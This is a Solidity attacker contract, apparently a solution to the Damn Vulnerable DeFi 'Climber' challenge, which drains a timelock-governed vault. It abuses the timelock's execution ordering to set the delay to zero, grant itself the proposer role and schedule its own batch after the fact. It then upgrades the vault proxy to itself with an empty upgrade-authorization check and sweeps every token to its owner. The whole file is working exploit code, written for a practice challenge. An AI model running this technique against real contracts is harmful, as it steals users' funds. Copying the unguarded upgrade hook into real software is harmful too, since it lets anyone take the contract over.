// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "../../contracts/DamnValuableToken.sol";

contract ClimberHacker is UUPSUpgradeable {
    ClimberTimelock  immutable timelock;
    DamnValuableToken  immutable token;
    address  immutable proxy;
    address immutable OWNER;
    constructor(address _timelock, address _proxy, address _token, address _owner) {
        timelock = ClimberTimelock(payable(_timelock));
        proxy = _proxy;
        token = DamnValuableToken(_token);
        OWNER = _owner;

    }

    function createProposal() internal view returns(address[] memory targets, uint256[] memory values, bytes[] memory dataElements ){
        targets = new address[](5);
        values = new uint256[](5);
        dataElements = new bytes[](5);


        //1. Call timelock.execute() + update delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        //2. Become a proposer
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, timelock.PROPOSER_ROLE(), address(this));
        
        //3.Schedule a proposal
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(ClimberHacker.scheduleProposal.selector);
        
        // 4. Change the impl of the proxy to this contract
        targets[3] = proxy;  
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(this));
        
        // 5. Get tokens
        targets[4] = proxy;
        values[4] = 0;
        dataElements[4] = abi.encodeWithSelector(ClimberHacker.sweepTokens.selector);
    }

    function execute() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = createProposal();
        timelock.execute(targets, values, dataElements, 0);
    }
    function scheduleProposal() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = createProposal();
         timelock.schedule(targets, values, dataElements, 0);
        
    }

    function sweepTokens() external {
        uint bal = token.balanceOf(address(this));
        token.transfer(OWNER, bal);
    }
    // Required function for inheriting from UUPSUpgradeable.
    function _authorizeUpgrade(address newImplementation) internal override {}
}